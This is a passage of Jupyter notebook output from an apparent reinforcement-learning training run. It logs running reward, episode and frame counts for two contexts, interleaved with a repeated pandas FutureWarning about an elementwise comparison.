      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 198\t Frame count: 98500\t Context: 1\n",
      "Running reward: 11.00\t Episode 198\t Frame count: 98600\t Context: 1\n",
      "Running reward: 11.00\t Episode 198\t Frame count: 98700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 198\t Frame count: 98800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 198\t Frame count: 98900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 198\t Frame count: 99000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 198\t Frame count: 99100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 199\t Frame count: 99200\t Context: 2\n",
      "Running reward: 11.00\t Episode 200\t Frame count: 99300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 200\t Frame count: 99400\t Context: 1\n",
      "Running reward: 11.00\t Episode 200\t Frame count: 99500\t Context: 2\n",
      "Running reward: 11.00\t Episode 200\t Frame count: 99600\t Context: 2\n",
      "Running reward: 11.00\t Episode 201\t Frame count: 99700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 201\t Frame count: 99800\t Context: 1\n",
      "Running reward: 11.00\t Episode 201\t Frame count: 99900\t Context: 1\n",
      "Running reward: 11.00\t Episode 202\t Frame count: 100000\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 100100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 203\t Frame count: 100200\t Context: 1\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 100300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 203\t Frame count: 100400\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 100500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 203\t Frame count: 100600\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 100700\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 100800\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 100900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 203\t Frame count: 101000\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 101100\t Context: 2\n",
      "Running reward: 11.00\t Episode 203\t Frame count: 101200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 203\t Frame count: 101300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 204\t Frame count: 101400\t Context: 2\n",
      "Running reward: 11.00\t Episode 204\t Frame count: 101500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 205\t Frame count: 101600\t Context: 1\n",
      "Running reward: 11.00\t Episode 205\t Frame count: 101700\t Context: 2\n",
      "Running reward: 11.00\t Episode 205\t Frame count: 101800\t Context: 2\n",
      "Running reward: 11.00\t Episode 205\t Frame count: 101900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 206\t Frame count: 102000\t Context: 1\n",
      "Running reward: 11.00\t Episode 206\t Frame count: 102100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 206\t Frame count: 102200\t Context: 2\n",
      "Running reward: 11.00\t Episode 206\t Frame count: 102300\t Context: 2\n",
      "Running reward: 11.00\t Episode 206\t Frame count: 102400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 206\t Frame count: 102500\t Context: 2\n",
      "Running reward: 11.00\t Episode 207\t Frame count: 102600\t Context: 1\n",
      "Running reward: 11.00\t Episode 207\t Frame count: 102700\t Context: 1\n",
      "Running reward: 11.00\t Episode 207\t Frame count: 102800\t Context: 1\n",
      "Running reward: 11.00\t Episode 207\t Frame count: 102900\t Context: 1\n",
      "Running reward: 11.00\t Episode 207\t Frame count: 103000\t Context: 2\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 208\t Frame count: 103200\t Context: 1\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103300\t Context: 1\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103400\t Context: 1\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103500\t Context: 2\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103600\t Context: 2\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 208\t Frame count: 103800\t Context: 2\n",
      "Running reward: 11.00\t Episode 208\t Frame count: 103900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 209\t Frame count: 104000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 209\t Frame count: 104100\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104200\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 209\t Frame count: 104400\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104500\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104600\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104700\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104800\t Context: 2\n",
      "Running reward: 11.00\t Episode 209\t Frame count: 104900\t Context: 2\n",
      "Running reward: 11.00\t Episode 210\t Frame count: 105000\t Context: 1\n",
      "Running reward: 11.00\t Episode 210\t Frame count: 105100\t Context: 2\n",
      "Running reward: 11.00\t Episode 210\t Frame count: 105200\t Context: 2\n",
      "Running reward: 11.00\t Episode 211\t Frame count: 105300\t Context: 1\n",
      "Running reward: 11.00\t Episode 211\t Frame count: 105400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 212\t Frame count: 105500\t Context: 1\n",
      "Running reward: 11.00\t Episode 212\t Frame count: 105600\t Context: 1\n",
      "Running reward: 11.00\t Episode 212\t Frame count: 105700\t Context: 1\n",
      "Running reward: 11.00\t Episode 212\t Frame count: 105800\t Context: 1\n",
      "Running reward: 11.00\t Episode 212\t Frame count: 105900\t Context: 2\n",
      "Running reward: 11.00\t Episode 212\t Frame count: 106000\t Context: 2\n",
      "Running reward: 11.00\t Episode 213\t Frame count: 106100\t Context: 2\n",
      "Running reward: 11.00\t Episode 214\t Frame count: 106200\t Context: 1\n",
      "Running reward: 11.00\t Episode 214\t Frame count: 106300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 214\t Frame count: 106400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 214\t Frame count: 106500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 214\t Frame count: 106600\t Context: 2\n",
      "Running reward: 11.00\t Episode 215\t Frame count: 106700\t Context: 2\n",
      "Running reward: 11.00\t Episode 215\t Frame count: 106800\t Context: 2\n",
      "Running reward: 11.00\t Episode 215\t Frame count: 106900\t Context: 2\n",
      "Running reward: 11.00\t Episode 215\t Frame count: 107000\t Context: 2\n",
      "Running reward: 11.00\t Episode 216\t Frame count: 107100\t Context: 1\n",
      "Running reward: 11.00\t Episode 216\t Frame count: 107200\t Context: 2\n",
      "Running reward: 11.00\t Episode 217\t Frame count: 107300\t Context: 1\n",
      "Running reward: 11.00\t Episode 217\t Frame count: 107400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 217\t Frame count: 107500\t Context: 2\n",
      "Running reward: 11.00\t Episode 218\t Frame count: 107600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 218\t Frame count: 107700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 218\t Frame count: 107800\t Context: 1\n",
      "Running reward: 11.00\t Episode 218\t Frame count: 107900\t Context: 2\n",
      "Running reward: 11.00\t Episode 218\t Frame count: 108000\t Context: 2\n",
      "Running reward: 11.00\t Episode 218\t Frame count: 108100\t Context: 2\n",
      "Running reward: 11.00\t Episode 219\t Frame count: 108200\t Context: 1\n",
      "Running reward: 11.00\t Episode 219\t Frame count: 108300\t Context: 1\n",
      "Running reward: 11.00\t Episode 219\t Frame count: 108400\t Context: 1\n",
      "Running reward: 11.00\t Episode 219\t Frame count: 108500\t Context: 2\n",
      "Running reward: 11.00\t Episode 219\t Frame count: 108600\t Context: 2\n",
      "Running reward: 11.00\t Episode 220\t Frame count: 108700\t Context: 1\n",
      "Running reward: 11.00\t Episode 220\t Frame count: 108800\t Context: 1\n",
      "Running reward: 11.00\t Episode 221\t Frame count: 108900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 221\t Frame count: 109000\t Context: 1\n",
      "Running reward: 11.00\t Episode 221\t Frame count: 109100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 221\t Frame count: 109200\t Context: 2\n",
      "Running reward: 11.00\t Episode 221\t Frame count: 109300\t Context: 2\n",
      "Running reward: 11.00\t Episode 221\t Frame count: 109400\t Context: 2\n",
      "Running reward: 11.00\t Episode 221\t Frame count: 109500\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 109600\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 109700\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 109800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 222\t Frame count: 109900\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110000\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110100\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110200\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110300\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110400\t Context: 1\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 222\t Frame count: 110600\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110700\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110800\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 110900\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 111000\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 111100\t Context: 2\n",
      "Running reward: 11.00\t Episode 222\t Frame count: 111200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 223\t Frame count: 111300\t Context: 1\n",
      "Running reward: 11.00\t Episode 223\t Frame count: 111400\t Context: 2\n",
      "Running reward: 11.00\t Episode 223\t Frame count: 111500\t Context: 2\n",
      "Running reward: 11.00\t Episode 223\t Frame count: 111600\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 111700\t Context: 1\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 111800\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 111900\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112000\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112100\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 224\t Frame count: 112300\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112400\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112500\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112600\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112700\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112800\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 112900\t Context: 2\n",
      "Running reward: 11.00\t Episode 224\t Frame count: 113000\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 113100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 225\t Frame count: 113200\t Context: 1\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 113300\t Context: 1\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 113400\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 113500\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 113600\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 113700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 225\t Frame count: 113800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 225\t Frame count: 113900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 225\t Frame count: 114000\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 114100\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 114200\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 114300\t Context: 2\n",
      "Running reward: 11.00\t Episode 225\t Frame count: 114400\t Context: 2\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 114500\t Context: 1\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 114600\t Context: 1\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 114700\t Context: 1\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 114800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 226\t Frame count: 114900\t Context: 1\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 115000\t Context: 1\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 115100\t Context: 2\n",
      "Running reward: 11.00\t Episode 226\t Frame count: 115200\t Context: 2\n",
      "Running reward: 11.00\t Episode 227\t Frame count: 115300\t Context: 1\n",
      "Running reward: 11.00\t Episode 227\t Frame count: 115400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
